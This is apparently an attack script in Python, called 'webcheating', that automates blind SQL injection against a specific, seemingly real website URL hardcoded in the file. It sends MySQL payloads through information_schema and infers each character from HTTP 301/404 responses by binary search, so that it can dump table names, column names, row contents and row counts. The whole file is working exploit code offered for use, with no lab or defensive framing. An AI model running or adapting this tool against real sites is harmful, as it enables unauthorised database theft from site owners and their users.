#import requests
import aiohttp
import asyncio
import string
import sys
import argparse

############################################## TODO: add caching and sessions + logs + dumps  w__W

parser = argparse.ArgumentParser(description="webcheating")
parser.add_argument("-m", "--mode", required=True, help="dump mode (table, column, entity, entity-count)")
parser.add_argument("-o", "--offset", type=int, default=0, help="start offset (default: 0)")
parser.add_argument("-T", "--table", required=False, help="table to enumerate")
parser.add_argument("-C", "--column", required=False, help="column to enumerate")
args = parser.parse_args()

usr_mode = args.mode
usr_offset = int(args.offset)
usr_table = args.table
usr_column = args.column
##############################################
url = "https://www.navigator-ds.ru/articles/92" 
true_code = 301
false_code = 404  
special_chars = "_.@-:;,/|!#$%^&*(){}[]=+~"

async def send_payload(mode, table, column, offset, position, num, char, session, operator='='):
    #print(f"mode={mode}, table={table}, column={column}, offset={offset}, position={position}, nums={nums}, char={char}, session={session}")
    payload_table_name = f"'OR IF((SELECT MID(table_name,{position},1) FROM information_schema.tables WHERE table_schema=database() LIMIT {offset},1){operator}'{char}',1,0)-- "
    payload_column_name = f"'OR IF((SELECT MID(column_name,{position},1) FROM information_schema.columns WHERE table_name='{table}' LIMIT {offset},1){operator}'{char}',1,0)-- "
    payload_entity = f"'OR IF((SELECT MID({column},{position},1) FROM {table} LIMIT {offset},1){operator}'{char}',1,0)-- "
    payload_entity_count = f"'OR IF((SELECT COUNT({column}) FROM {table}){operator}{num},1,0)-- "
    
    full_url_table = f"{url}{payload_table_name}"
    full_url_column = f"{url}{payload_column_name}"
    full_url_entity = f"{url}{payload_entity}"
    full_url_entity_count = f"{url}{payload_entity_count}"

    if mode == 'table':
        async with session.get(full_url_table, allow_redirects=False) as response:
            sys.stdout.write("\033[s")
            print(f"[*] POSITION [{position}]")
            print(f"[*] payload[{position}]: {char}")
            sys.stdout.flush()

            sys.stdout.write("\033[u")
            sys.stdout.write(f"\033[2K\r[+] table name: {general_name} | offset [{offset}]")
            return response.status == true_code
    elif mode == 'column':
        async with session.get(full_url_column, allow_redirects=False) as response:
            sys.stdout.write("\033[s")
            print(f"[*] POSITION [{position}]")
            print(f"[*] payload[{position}]: {char}")
            sys.stdout.flush()

            sys.stdout.write("\033[u")
            sys.stdout.write(f"\033[2K\r[+] column name: {general_name} | offset [{offset}]")
            return response.status == true_code
    elif mode == 'entity':
        async with session.get(full_url_entity, allow_redirects=False) as response:
            sys.stdout.write("\033[s")
            print(f"[*] POSITION [{position}]")
            print(f"[*] payload[{position}]: {char}")
            sys.stdout.flush()
    
            sys.stdout.write("\033[u")
            sys.stdout.write(f"\033[2K\r[+] entity name: {general_name} | offset [{offset}]")
            return response.status == true_code
    elif mode == 'entity-count':
        async with session.get(full_url_entity_count, allow_redirects=False) as response:
            sys.stdout.write("\033[s")
            print(f"[*] POSITION []")
            print(f"[*] payload: {num}")
            sys.stdout.flush()
    
            sys.stdout.write("\033[u")
            sys.stdout.write(f"\033[2K\r[+] entity count: {entity_counter} | offset [{offset}]")
            return response.status == true_code


async def binary_search(offset, position, nums, chars, session):
    if usr_mode == 'entity-count':
        left, right = 0, len(nums) - 1
    else:
        left, right = 0, len(chars) - 1
    
    while left <= right:
        mid = (left + right) // 2 ########################################## fix this watafak ==>> ENTITY_COUNTER/entity-count
        #print(f"MID == {mid} | chars[mid] == {chars[mid]} | {usr_mode}")
        #print(f"nums[MID] == {nums[mid]}")
        if usr_mode == 'entity-count':
            if await send_payload(usr_mode, usr_table, usr_column, offset, position, nums[mid], chars, session, ">"):
                left = mid + 1  # char to left
            elif await send_payload(usr_mode, usr_table, usr_column, offset, position, nums[mid], chars, session, "="):
                return nums[mid]  # char to right
            else:
                right = mid - 1  # char to left
        else:
            if await send_payload(usr_mode, usr_table, usr_column, offset, position, nums, chars[mid], session, ">"):
                left = mid + 1  # char to left
            elif await send_payload(usr_mode, usr_table, usr_column, offset, position, nums, chars[mid], session, "="):
                return chars[mid]  # char to right
            else:
                right = mid - 1  # char to left
    return None

async def extract_table_name():
    global general_name, entity_counter
    general_name = ""
    #table_name = ""
    #column_name = ""
    #entity_name = ""
    position = 1
    offset = usr_offset
    chars = sorted(string.ascii_lowercase + string.digits + "{}$()")
    nums = [str(i) for i in range(501)]
    entity_counter = 0
    
    sys.stdout.write("\n") 
    sys.stdout.flush()

    async with aiohttp.ClientSession() as session:
        while True:
            
            try:
                if usr_mode == 'entity-count':
                    num = await binary_search(offset, position, nums, chars, session)
                    if num:
                        entity_counter = int(num)
                        sys.stdout.write("\n")
                        print(f"[+] done. entities in column: ", entity_counter)
                        offset += 1
                        entity_counter = 0
                        break
                else:
                    tasks = [send_payload(usr_mode, usr_table, usr_column, offset, position, nums, char, session, "=") for char in special_chars]
                    results = await asyncio.gather(*tasks)
                    
                    # prepared chars list
                    for i, char in enumerate(special_chars):
                        if results[i]:
                            general_name += char
                            #table_name += char 
                            #column_name += char
                            #entity_name += char
                            position += 1
                            break
                    else:
                        # binary search
                        char = await binary_search(offset, position, nums, chars, session)
                        #print(f"CHAR = {char}")
                        #print("stage 3")
                        if char:
                            general_name += char
                            #table_name += char
                            #column_name += char
                            #entity_name += char
                            position += 1
                        else:
                            sys.stdout.write("\n")
                            print(f"[+] done. data dumped: [{general_name}]\n")
                            offset += 1
                            position = 1
                            general_name = ""
                            #column_name_temp = column_name
                            #column_name = ""
                            #table_name = ""
                            #break

            except:
                #print("error")
                #break
                pass

    return general_name, entity_counter

if __name__ == "__main__":
    asyncio.run(extract_table_name())

